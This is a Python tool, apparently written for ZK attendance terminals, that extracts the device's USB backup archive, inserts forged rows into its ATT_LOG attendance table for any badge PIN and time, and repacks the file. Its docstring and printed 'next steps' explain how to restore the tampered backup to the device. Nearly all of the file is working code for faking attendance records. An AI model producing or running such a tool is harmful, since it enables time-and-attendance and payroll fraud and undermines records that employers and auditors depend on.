"""ZK USB ATTLOG Editor - Modify attendance records via USB backup.

Attack chain (verified via hacker research):
1. Insert USB drive into ZK device
2. Menu → USB Manager → Backup Data → Select Business+Config → Start
3. Device writes `backupdata.dat` (7-zip archive) to USB
4. Inside: `ZKDB.db` (SQLite3 database) with tables:
   - ATT_LOG: attendance records
   - USER_INFO: user info
   - fptemplate10: fingerprint templates
5. Modify ZKDB.db: INSERT INTO ATT_LOG
6. Re-pack backupdata.dat
7. Insert USB back into device
8. Menu → USB Manager → Restore Data → Start
9. Device restores ATT_LOG from modified file

This is the ONLY working remote-write method on ZK FW 6.60.

Usage:
  python zk_usb_attlog_editor.py <backupdata.dat> [--insert PIN TIME STATUS VERIFY]
  python zk_usb_attlog_editor.py <backupdata.dat> [--extract]
  python zk_usb_attlog_editor.py <dir> [--repack]
"""
import argparse
import os
import shutil
import sqlite3
import struct
import subprocess
import sys
import tempfile
import time
import datetime


def detect_backup_file(path):
    """Check if file is a 7-zip archive (signature 37 7A BC AF 27 1C)."""
    with open(path, 'rb') as f:
        sig = f.read(6)
    if sig == b'\x37\x7a\xbc\xaf\x27\x1c':
        return '7z'
    if sig[:4] == b'PK\x03\x04':
        return 'zip'
    return None


def run_7z(args, working_dir=None):
    """Run 7z command. Uses Windows 7-zip if available."""
    candidates = [
        r"C:\Program Files\7-Zip\7z.exe",
        r"C:\Program Files (x86)\7-Zip\7z.exe",
        "7z",
        "7z.exe",
    ]
    for cand in candidates:
        if os.path.exists(cand) or shutil.which(cand):
            try:
                cmd = [cand] + args
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                if r.returncode == 0:
                    return r.stdout, r.stderr
            except Exception as e:
                continue
    # Try python 7z lib
    try:
        import py7zr  # type: ignore
        # Use py7zr for archive
        if args[0] == 'x':
            with py7zr.SevenZipFile(args[args.index('-o')+1].rstrip('\\'), 'r') as z:
                z.extractall(path=args[args.index('-o')+1])
            return '', ''
        if args[0] == 'a':
            archive = args[-2]
            target = args[-1]
            with py7zr.SevenZipFile(archive, 'w') as z:
                z.writeall(target)
            return '', ''
    except ImportError:
        pass
    return None, 'No 7z tool found'


def extract_backup(backup_path, extract_dir):
    """Extract 7z backup."""
    os.makedirs(extract_dir, exist_ok=True)
    stdout, stderr = run_7z(['x', '-y', f'-o{extract_dir}', backup_path])
    if stdout is None:
        print(f'7z extract failed: {stderr}')
        return False
    # Find ZKDB.db
    for root, _, files in os.walk(extract_dir):
        for f in files:
            if f.lower() == 'zkdb.db' or f.lower() == 'attbackup.db':
                print(f'Found DB at: {os.path.join(root, f)}')
    return True


def list_attlog(db_path):
    """List recent attendance records."""
    conn = sqlite3.connect(db_path)
    cur = conn.cursor()
    # Find attendance table
    cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name LIKE '%ATT%LOG%' COLLATE NOCASE")
    tables = [r[0] for r in cur.fetchall()]
    print(f'\nAttendance tables found: {tables}')

    for table in tables:
        print(f'\n=== {table} ===')
        try:
            cur.execute(f'SELECT * FROM {table} ORDER BY ROWID DESC LIMIT 10')
            cols = [d[0] for d in cur.description]
            print('Columns:', cols)
            for row in cur.fetchall():
                print(' ', row)
        except Exception as e:
            print(f'  ERR: {e}')

    cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
    all_tables = [r[0] for r in cur.fetchall()]
    print(f'\nAll tables in DB: {all_tables}')
    conn.close()


def insert_attlog(db_path, pin, ts_str, status=0, verify=1, workcode=0):
    """Insert new attendance record.

    ATT_LOG typical schema (from research):
      ID (autoinc), badgenumber (PIN), TIME (datetime), STATUS, VERIFY,
      WORKCODE, RESERVED1, RESERVED2, RESERVED3, RESERVED4, SENSORID

    Some FW use different column names; we try common ones.
    """
    conn = sqlite3.connect(db_path)
    cur = conn.cursor()

    # Get ACTUAL table name and column names
    cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name LIKE '%ATT%LOG%' COLLATE NOCASE")
    tables = [r[0] for r in cur.fetchall()]
    if not tables:
        print('No ATT_LOG table found')
        conn.close()
        return False

    table = tables[0]  # use first match

    # Get column names
    cur.execute(f'PRAGMA table_info({table})')
    cols = [r[1] for r in cur.fetchall()]
    print(f'Table: {table}')
    print(f'Columns: {cols}')

    # Build INSERT based on detected columns
    # Map common ZK column names to values
    val_map = {
        'PIN': str(pin), 'badgenumber': str(pin), 'BADGENUMBER': str(pin),
        'USERID': str(pin), 'userid': str(pin),
        'TIME': ts_str, 'CHECKTIME': ts_str, 'checktime': ts_str,
        'check_time': ts_str, 'TIMESTAMP': ts_str, 'timestamp': ts_str,
        'STATUS': status, 'STATUS2': status, 'CHECKTYPE': status,
        'checktype': status, 'STATUS1': status,
        'VERIFY': verify, 'VERIFYCODE': verify, 'VERIFYMODE': verify,
        'verifymode': verify, 'VERIFY_TYPE': verify,
        'WORKCODE': workcode, 'WORKCODEID': workcode,
        'RESERVED1': '', 'RESERVED2': '', 'RESERVED3': '',
        'RESERVED4': '', 'RESERVED5': '',
        'SENSORID': '', 'sensorid': '', 'SENSOR_ID': '',
        'Memoinfo': '', 'memoInfo': '',
    }

    # Build column list and value list
    col_list = []
    val_list = []
    for c in cols:
        if c.upper() in val_map or c.lower() in val_map:
            # Match by uppercase or lowercase
            v = val_map.get(c, val_map.get(c.upper(), val_map.get(c.lower())))
            if v is not None:
                col_list.append(c)
                val_list.append(v)

    # Auto-fill ID if exists and is autoincrement
    print(f'Insert columns: {col_list}')
    print(f'Insert values: {val_list}')

    placeholders = ','.join(['?'] * len(col_list))
    col_sql = ','.join(col_list)
    cur.execute(f'INSERT INTO {table} ({col_sql}) VALUES ({placeholders})', val_list)
    conn.commit()

    print(f'\n✓ Inserted 1 row. Last rowid: {cur.lastrowid}')

    # Verify by listing
    print('\n=== Last 3 records (after insert) ===')
    cur.execute(f'SELECT * FROM {table} ORDER BY ROWID DESC LIMIT 3')
    for row in cur.fetchall():
        print(' ', row)

    conn.close()
    return True


def repack_backup(extract_dir, output_path):
    """Repack into 7z archive preserving the original structure.

    ZK devices expect specific paths inside the 7z. We auto-detect by
    walking the directory and using the right arcname.
    """
    if os.path.exists(output_path):
        os.remove(output_path)
    # Use py7zr directly: walk the directory, add each file with relative path
    import py7zr
    with py7zr.SevenZipFile(output_path, 'w') as z:
        for root, _, files in os.walk(extract_dir):
            for f in files:
                full = os.path.join(root, f)
                rel = os.path.relpath(full, extract_dir)
                # Use forward slashes for cross-platform compat
                rel = rel.replace(os.sep, '/')
                z.write(full, arcname=rel)
    print(f'Repacked: {output_path}')
    return True


def main():
    p = argparse.ArgumentParser(description='ZK USB ATTLOG Editor')
    p.add_argument('path', help='backupdata.dat (read) or extract dir (write)')
    p.add_argument('--mode', choices=['auto', 'extract', 'read', 'write', 'repack'],
                   default='auto')
    p.add_argument('--insert', nargs=4, metavar=('PIN', 'TIME', 'STATUS', 'VERIFY'),
                   help='Insert record: PIN TIME_STR STATUS VERIFY (e.g. 1383 2026-09-14T08:30:00 0 15)')
    p.add_argument('--out', default=None, help='Output path for repacked backup')
    args = p.parse_args()

    if not os.path.exists(args.path):
        print(f'Path not found: {args.path}')
        sys.exit(1)

    mode = args.mode
    if mode == 'auto':
        if detect_backup_file(args.path) == '7z':
            mode = 'read'
        elif os.path.isdir(args.path):
            mode = 'repack'

    print(f'Mode: {mode}')
    print(f'Path: {args.path}')

    work_dir = tempfile.mkdtemp(prefix='zk_')
    print(f'Work dir: {work_dir}')

    try:
        if mode in ('extract', 'read'):
            # Extract backupdata.dat
            extract_dir = os.path.join(work_dir, 'extracted')
            if not extract_backup(args.path, extract_dir):
                sys.exit(1)

            # Find ZKDB.db
            db_path = None
            for root, _, files in os.walk(extract_dir):
                for f in files:
                    if f.lower() in ('zkdb.db', 'attbackup.db', 'dbase.db'):
                        db_path = os.path.join(root, f)
                        break
                if db_path:
                    break

            if not db_path:
                print('No ZKDB.db found in archive')
                sys.exit(1)

            print(f'\nDB: {db_path}')
            list_attlog(db_path)

            if args.insert:
                pin, ts_str, status, verify = args.insert
                insert_attlog(db_path, pin, ts_str, int(status), int(verify))

            if mode == 'extract':
                # Copy extracted to current dir
                output = args.path + '.extracted'
                if os.path.exists(output):
                    shutil.rmtree(output)
                shutil.copytree(extract_dir, output)
                print(f'Extracted to: {output}')

        elif mode == 'repack':
            output = args.out or 'backupdata.modified.dat'
            extract_dir = args.path
            # Find and modify DB if --insert given
            if args.insert:
                for root, _, files in os.walk(extract_dir):
                    for f in files:
                        if f.lower() in ('zkdb.db', 'attbackup.db', 'dbase.db'):
                            db_path = os.path.join(root, f)
                            pin, ts_str, status, verify = args.insert
                            insert_attlog(db_path, pin, ts_str, int(status), int(verify))
                            break

            if not repack_backup(extract_dir, output):
                sys.exit(1)
            print(f'\nNext steps:')
            print(f'  1. Copy {output} to USB root')
            print(f'  2. Rename to backupdata.dat (if device requires)')
            print(f'  3. Insert USB into ZK device')
            print(f'  4. Menu → USB Manager → Restore Data → Start')
            print(f'  5. Device reboots and restores ATT_LOG')

    finally:
        shutil.rmtree(work_dir, ignore_errors=True)


if __name__ == '__main__':
    main()
